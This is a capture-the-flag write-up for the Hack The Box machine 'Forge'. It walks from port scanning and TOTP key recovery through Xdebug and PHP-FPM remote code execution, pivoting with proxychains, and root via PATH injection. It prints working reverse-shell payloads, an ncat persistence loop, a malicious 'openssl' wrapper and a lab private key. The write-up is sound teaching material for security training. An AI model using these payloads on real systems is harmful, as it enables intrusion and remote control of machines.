# HTB Forge - writeup

![boxinfo](images/box-info.png)

Machine was stared and it aquired IP address - `10.129.192.108`

## Reconnaissance

Simple nmap scan on all ports was performed:
```console
$ nmap -p- -v -Pn -oN nmap-all.res 10.129.192.108
Nmap scan report for 10.129.192.108
Host is up (0.061s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
2222/tcp open  EtherNetIP-1
8080/tcp open  http-proxy
```
Then, more advanced scan was done on ports that were found. Flags that allow to enumerate versions of services and execute default lua script, were passed to nmap:
```console
$ nmap -p22,2222,8080 -sV -sC -oN nmap.res -Pn 10.129.192.108
Nmap scan report for 10.129.192.108
Host is up (0.072s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 16:bb:a0:a1:20:b7:82:4d:d2:9f:35:52:f4:2e:6c:90 (RSA)
|_  256 ca:ad:63:8f:30:ee:66:b1:37:9d:c5:eb:4d:44:d9:2b (ECDSA)
2222/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:a4:5c:e3:a9:05:54:b1:1c:ae:1b:b7:61:ac:76:d6 (RSA)
|   256 c9:58:53:93:b3:90:9e:a0:08:aa:48:be:5e:c4:0a:94 (ECDSA)
|_  256 c7:07:2b:07:43:4f:ab:c8:da:57:7f:ea:b5:50:21:bd (ED25519)
8080/tcp open  http    Apache httpd 2.4.38 ((Debian))
| http-robots.txt: 2 disallowed entries 
|_/vpn/ /.ftp_uploads/
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Three TCP ports were found opened:
- 22 (SSH 7.9p1)
- 2222 (SSH 7.6p1)
- 8080 (Apache HTTPd 2.4.38)

Those versions have existing vulnerabilities but none of them are in any use in this scenario:
- https://nvd.nist.gov/vuln/search/results?form_type=Advanced&cves=on&cpe_version=cpe:/a:openbsd:openssh:7.6p1
- https://vulmon.com/searchpage?q=apache+http+server+2.4.38


Scripts revealed that behind port `8080` works httpd webserver and it hosts:
- `robots.txt` file
- `/vpn/` path
- `/.ftp_uploads/` path

The last one was accessed first:

![ftp_uploads](images/ftp_uploads.png)

All accessible files were downloaded. `db.sql.gz` was a corrupted gzip archive, and `warning.txt` contained a warning about...corrupted files:
```console
$ cat warning.txt
Binary files are being corrupted during transfer!!! Check if are recoverable.
```
Corruption was confirmed with `gunzip db.sql.gz`

![gunzip-error](images/gunzip-error.png)

Fortunately, there are open-source projects for gzip recovery like `gzrt`. It was installed and used on the archive:
```console
$ sudo apt install gzrt
$ gzrecover db.sql.gz
```
New file `db.sql.recovered` was created and its content was:
```sql
CREATE DATABASE static;
USE static;
CREATE TABLE users ( id smallint unsignint  a'n a)Co3 Nto_increment,sers name varchar(20) a'n a)Co, password varchar(40) a'n a)Co, totp varchar(16) a'n a)Co, primary key (idS iaA; 
INSERT INTOrs ( id smaers name vpassword vtotp vaS iayALUESsma, prim'admin'im'd05nade22ae348aeb5660fc2140aec35850c4da997m'd0orxxi4c7orxwwzlo'
IN
```
Corruption mixed last `INSERT` but we will return to it shortly. 

Next found endpoint was `/vpn/`:

![vpn-login](images/vpn-login.png)

As always with that kind of login forms, simple authentication tries were performed with credentials:
```
admin:password
admin:admin
root:root
admin:admin123
```
Surprisingly, `admin:admin` worked, and redirected to `2FA Enabled` form, which looked like it waited for an input of OTP (One Time Password):

![vpn-otp](images/vpn-otp.png)

Now lets return to a corrupted database dump, recovered with `gzrt`. It contained one column named `vtotp` which probably should be named `totp` without corrupted bytes. Time based OTPs are easy to generate if proper key is present. 

Gobuster scan on `/vpn/` endpoint revealed additional directory `/src/`:
```console
$ gobuster dir -u http://10.129.192.108:8080/vpn/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.192.108:8080/vpn/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2021/11/24 11:10:59 Starting gobuster in directory enumeration mode
===============================================================
/login.php            (Status: 200) [Size: 358]
/index.php            (Status: 302) [Size: 0] [--> login.php]
/header.php           (Status: 200) [Size: 0]                
/src                  (Status: 301) [Size: 312] [--> http://172.20.0.10/vpn/src/]
/database.php         (Status: 200) [Size: 0]                                    
/actions.php          (Status: 302) [Size: 0] [--> index.php]
```

There, 3 new `php` files were discovered:

![vpn-src](images/vpn-src.png)

Presence of `Base32.php` and `Totp.php` only confirmed that what we need is a OTP generator that accepts key in base32 format. Unfortunately, entry from database (`d0orxxi4c7orxwwzlo`) contains two characters which are not present in base32 keyspace: `d` and `0`. Nevertheless, simple python script was created and run with this key, but with `d` and `0` removed:

```python
import pyotp

key = 'orxxi4c7orxwwzlo'
otp = pyotp.totp.TOTP(key)
print(otp.now())
```

![vpn-gen](images/vpn-generator.png)

It worked, and returned proper OTP. Another attempt to login was made:

![vpn-login-attempt](images/vpn-login-attempt.png)

It was successful, and redirected to `/vpn/panel.php`:

![vpn-panel](images/vpn-panel.png)

When `Common Name` was entered in the visible form and `Generate` button was clicked, a vpn configuration file was created. New key was generated with a `Common Name` equal to `pentest`.

![pentest-ovpn](images/pentest-ovpn.png)

However, `openvpn` command hanged when used on this file. It was because it contained harcoded domain name instead of an IP address:

![openvpn-domain](images/openvpn-domain.png)

It was added to `/etc/hosts` and connection was established successfully.

![etchosts](images/etchosts.png)

```console
$ sudo openvpn pentest.ovpn
[REDACTED]
2021-11-24 11:28:08 net_route_v4_add: 172.17.0.0/24 via 172.30.0.1 dev [NULL] table 0 metric -1
2021-11-24 11:28:08 GID set to nogroup
2021-11-24 11:28:08 UID set to nobody
2021-11-24 11:28:08 WARNING: this configuration may cache passwords in memory -- use the auth-nocache option to prevent this
2021-11-24 11:28:08 Initialization Sequence Completed
```

Routes were not automatically added for all IP addresses listed in `/vpn/panel.php` (networks `172.20.0.0/24` and `192.168.254.0/24`) so they were created manualy:
```console
$ sudo ip route add 172.20.0.0/24 via 172.30.0.1 dev tun9
$ sudo ip route add 192.168.254.0/24 via 172.30.0.1 dev tun9
```

![iproutes](images/iproutes.png)

# Initial foothold

Nmap scan (similar to the one from the beginning) was made:
```console
$ nmap -p- -oN nmap-20.0.10-all.res 172.20.0.10
Nmap scan report for 172.20.0.10
Host is up (0.050s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```console
$ nmap -p22,80 -sV -sC -oN nmap-20.0.10.res -Pn 172.20.0.10
Nmap scan report for 172.20.0.10
Host is up (0.061s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 a9:a4:5c:e3:a9:05:54:b1:1c:ae:1b:b7:61:ac:76:d6 (RSA)
|   256 c9:58:53:93:b3:90:9e:a0:08:aa:48:be:5e:c4:0a:94 (ECDSA)
|_  256 c7:07:2b:07:43:4f:ab:c8:da:57:7f:ea:b5:50:21:bd (ED25519)
80/tcp open  http    Apache httpd 2.4.29
| http-ls: Volume /
| SIZE  TIME              FILENAME
| 19    2020-04-03 15:18  info.php
| -     2020-03-26 09:40  vpn/
|_
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Index of /
Service Info: Host: 172.20.0.10; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Lua script `http-ls` found that `info.php` file is present at `http://172.20.0.10/info.php`. It contains configuration of php environment on the target. After analyzing this output, one PHP extension stand out - `xdebug`. It is prone to RCE and there is an exploit available in metasploit:

![xdebug](images/xdebug-searchsploit.png)

Metasploit was started and exploit prepared:
![xdebug-msf](images/xdebug-msf.png)
![xdebug-msf2](images/xdebug-msf2.png)

An access was aquired with user `www-data`.

![init](images/initial-shell.png)

Port 22 was found open, so we checked for keys in default directories:

![id_rsa](images/id_rsa.png)
```console
$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA0pNa5qwGZ+DKsS60GPhNfCqZti7z1xPzxOTXwtwO9uYzZpq/
nrhzgJq0nQNVRUbaiZ+H6gR1OreDyjr9YorV2kJqccscBPZ59RAhttaQsBqHkGjJ
QEHYKteL1D+hJ80NDd7fJTtQgzT4yBDwrVKwIUSETMfWgzJ5z24LN5s/rcQYgl3i
VKmls3lsod8ilakdDoYEYt12L4ST/exEoVl0AyD9y8m651q40k1Gz4WzPnaHAlnj
mL6CANfiNAJoc8WnqZN5ruSrWhmivmDbKLlDCO5bCCzi2zMHJKqQkcBxdWk60Qhi
17UJMV3mKVQRprvpeTR2jCMykH81n2KU46doSQIDAQABAoIBAADCHxWtkOhW2uQA
cw2T91N3I86QJLiljb8rw8sj17nz4kOAUyhTKbdQ102pcWkqdCcCuA6TrYhkmMjl
pXvxXAvJKXD3dkZeTNohEL4Dz8mSjuJqPi9JDWo6FHrTL9Vg26ctIkiUChou2qZ9
ySAWqCO2h3NvVMpsKBwjHU858+TASlo4j03FJOdmROmUelcqmRimWxgneHBAHEZj
GqDuPjmPmw7pbThqlETyosrbaB3rROzUp9CKAHzYB1BvOTImDsb6qQ+GdKwewAQf
j60myPuxl4qgY8O2yqLFUH3/ovtPTKqHJSUFBO23wzS1qPLupzu1GVXwlsdlhRWA
Amvx+AECgYEA6OOd9dgqXR/vBaxDngWB6ToVysWDjO+QsjO4OpFo7AvGhMRR+WpK
qbZyJG1iQB0nlAHgYHEFj4It9iI6NCdTkKyg2UzZJMKJgErfgI0Svkh/Kdls23Ny
gxpacxW3d2RlyAv4m2hG4n82+DsoPcN+6KxqGRQxWywXtsBsYkRb+wkCgYEA53jg
+1CfGEH/N2TptK2CCUGB28X1eL0wDs83RsU7Nbz2ASVQj8K0MlVzR9CRCY5y6jcq
te1YYDiuFvT+17ENSe5fDtNiF1LEDfp45K6s4YU79DMp6Ot84c2fBDIh8ogH0D7C
CFdjXCI3SIlvc8miyivjRHoyJYJz/cO94DsTE0ECgYA1HlWVEWz4OKRoAtaZYGA1
Ng5qZYqPxsSWIL3QfgIUdMse1ThtTxUgiICYVmqmfP/d/l+TH7RI+0RIc54a7y1c
PkOhzKlqfQSnwmwgAg1YYWi/vtvZYgeoZ4Zh4X4rOTcN3c0ihTJFzwZWsAeJruFv
aIP6nGR1iyUNhe4yq6zfIQKBgANYQNAA2zurgHeZcrMUqsNdefXmB2UGPtKH9gGE
yhU9tMRReLeLFbWAfJj2D5J2x3xQ7cIROuyxBPr58VDGky2VTzRUo584p/KXwvVy
/LaJiVM/BgUCmhxdL0YNP2ZUxuAgeAdM0/e52time8DNkhefyLntlhnqp6hsEqtR
zzXBAoGBANB6Wdk/X3riJ50Bia9Ai7/rdXUpAa2B4pXARnP1/tw7krfPM/SCMABe
sjZU9eeOecWbg+B6RWQTNcxo/cRjMpxd5hRaANYhcFXGuxcg1N3nszhWDpHIpGr+
s5Mwc3oopgv6gMmetHMr0mcGz6OR9KsH8FvW1y+DYY3tUdgx0gau
-----END RSA PRIVATE KEY-----
```

Key was copied to our machine, victim was accessed via ssh and flag was copied from a nonstandard path `/home/user.txt`:

![first ssh](images/first_ssh.png)

## Pivoting

Linpeas script is copied to the target:
```console
$ cp /opt/PEASS-ng/linPEAS/linpeas.sh ./lin.sh
$ scp -i www-data_id_rsa lin.sh www-data@172.20.0.10:~/
```

Then, it is executed and passed to `tee` command so output is simultanously saved to a file:
```console
$ ./lin.sh | tee lin.log
```

Nothing interesting was found except for interfaces:

![interfaces](images/interfaces.png)


As can be seen, this machine has access to `192.168.254.0/24` network. We use `ssh` as a proxy for nmap. SSH connection is established with a `-D 20123` flag specifying port for proxy. Proxychains configuration file `/etc/proxychains4.conf` is modified:
- `static_chain` is commented with `#` and `dynamic_chain` is uncommented
- `socks4 127.0.0.1 20123` entry is appended at the bottom of the file 

Now, nmap is run with proxychains and `-sT` flag so it works behind proxy:
```console
$ proxychains -q nmap -sT -sC -sV -v -oN nmap-254-3.res 192.168.254.3
Nmap scan report for 192.168.254.3
Host is up (0.052s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Only one port was discovered (out of 1000 most popular ones) and it turned out to be port 80 with `nginx 1.14.0`. Simple curl was made to it:
```console
$ proxychains -q curl -vv http://192.168.254.3/
*   Trying 192.168.254.3:80...
* Connected to 192.168.254.3 (127.0.0.1) port 80 (#0)
> GET / HTTP/1.1
> Host: 192.168.254.3
> User-Agent: curl/7.74.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: nginx/1.14.0 (Ubuntu)
< Date: Wed, 24 Nov 2021 18:22:18 GMT
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< X-Powered-By: PHP-FPM/7.1
<
batch mode: /usr/bin/ersatool create|print|revoke CN
* Connection #0 to host 192.168.254.3 left intact
```

As can be seen in `X-Powered-By` header, PHP with FPM is working behind that nginx webserver. This combination has [well known](https://www.exploit-db.com/exploits/48182) `RCE` vulnerability which can be found in searchsploit:

![fpm](images/searchsploit-fpm.png)

We used [publicly available go package](https://github.com/neex/phuip-fpizdam) which we found more stable via proxy than metasploit version:
```console
$ go get github.com/neex/phuip-fpizdam
$ proxychains ~/go/bin/phuip-fpizdam http://192.168.254.3/index.php
$ proxychains curl "http://192.168.254.3/index.php?a=/bin/sh+-c+'which+which'&"
```

![fpm-exploit1](images/fpm-exploit-working.png)
![fpm](images/fpm-exploit-working2.png)

We confirmed that exploit worked. To make exploitation easier, we created simple python script:
```python3
import requests

data = f'/bin/sh -c "ping -c1 172.30.0.9"'
params = {'a': f'{data}'}

response = requests.get('http://192.168.254.3/index.php', params=params)
content = response.content.decode()
print(''.join(content.split('\n')[:-3]))
```

![ping](images/portunreachable.png)

Unfortunately, it confirmed that target does not know the network route to us. Luckily, our first target knows that route, so [`netcat`](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/ncat) was transfered to that machine.

- Host:
```console
$ wget https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/ncat
$ python3 -m http.server 8000
```

![http.server](images/pythonserver.png)

- Target:
```console
$ wget http://172.30.0.9:8000/ncat
$ chmod +x ncat 
$ ./ncat -lvnp 4444
```

![ncat](images/ncat-listening.png)

Reverse shell for python3 was copied from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python) to our script and passed as a data parameter (with IP and port edited):
```python3
import requests

data = f"""/usr/bin/python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.254.2",54444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"""
params = {'a': f'{data}'}

response = requests.get('http://192.168.254.3/index.php', params=params)
content = response.content.decode()
print(''.join(content.split('\n')[:-2]))
```

Script was executed on our main machine and connection was established on our first target:
```console
$ proxychains python3 test.py
```

![startattack](images/pivot-start.png)
![connection established](images/connection-established.png)

TTY shell was spawned with:
```console
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL-Z
$ stty raw -echo; fg
$ export TERM=xterm
```
![stty-raw](images/stty-raw-echo.png) 

This target didn't have `curl` or `wget` so we created our own:
```console
$ function __curl() {
  read proto server path <<<$(echo ${1//// })
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80

  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  (while read line; do
   [[ "$line" == $'\r' ]] && break
  done && cat) <&3
  exec 3>&-
}
```

We pasted that into the terminal and downloaded linpeas from first target:

![Custom curl](images/custom_curl.png) 

Linpeas didn't find anything useful. Ncat was downloaded the same way as linpeas and due to lack of `cron`, simple bash script was created:
```bash
#!/bin/bash
while [ : ]
do
        /tmp/ncat 192.168.254.2 4242 -e /bin/bash 2>/dev/null
        sleep 5
done
```
It was executed with:
```console
$ ./cron.sh &
```

## Privilege escalation

To monitor processes running on the target 2, [pspy](https://github.com/DominicBreuker/pspy) was transfered and executed:

![Pspy transferred](images/pspy-transfer.png) 
![Pspy running](images/pspy-running.png) 


Going back to first discovery of the second target. When port 80 was accessed, output of some command was shown. It was `/usr/bin/ersatool`. New session was established to target 2 and we tried to run this:

![ersatool](images/ersatool.png) 

During its execution, a few new entries showed in pspy output:

![openssl](images/openssl-detected.png) 

Openssl can be seen there. What is important, is that it isn't using absolute path of `openssl` and is running with `UID=0` which is a user id of root. PATH injection attack may be performed.

We switch to a path where we have `write` rights (e.g. `/tmp/`). We create `openssl` file and paste simple reverse shell code there:
```console
$ cd /tmp
$ echo '#!/bin/bash' > openssl
$ echo '/tmp/ncat 192.168.254.2 31337 -e /bin/bash' >> openssl
$ chmod +x openssl
```
Then, we set up listener on target 1 on port 51337 and we execute `/usr/bin/ersatool` on target 2 with `create` command. Connection is established to our ncat:
 
![init root](images/initial-root.png) 

This could be seen in pspy output:

![pspy root](images/pspy-root-init.png) 

We can read our flag:
![final shell](images/root-shell-full.png) 
